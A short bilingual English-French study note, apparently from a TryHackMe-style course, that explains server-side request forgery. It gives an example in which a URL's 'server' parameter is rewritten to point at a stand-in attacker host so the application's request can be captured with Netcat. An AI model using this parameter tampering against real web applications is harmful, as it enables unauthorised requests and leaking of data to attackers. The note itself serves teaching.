# (SSRF) Server Site Request Forgery

This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself.  SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services. 

En français : 


La vulnérabilité provient d'une requête efféctuée par le serveur vers un 2ème serveur.  
Cela peut se produire dans le cas où le serveur cible à besoin de requeter un 3ème système.  
La vulnérabilité est fondée lorsque l'utilisateur peut impacter la requete vers le 3ème server.  
D'où SERVER SIDE REQUEST FORGERY  

Exemple : (Par défault, la requête de ce site provient avec ces paramètres)  
https://www.mysite.com/sms?server=srv3.sms.txt&msg=hello

On peut donc la modifier comme suit :  

https://www.mysite.com/sms?server=attacker.thm&msg=ABC

This would make the vulnerable web application make a request to:

https://attacker.thm/api/send?msg=ABC 

You could then just capture the contents of the request using Netcat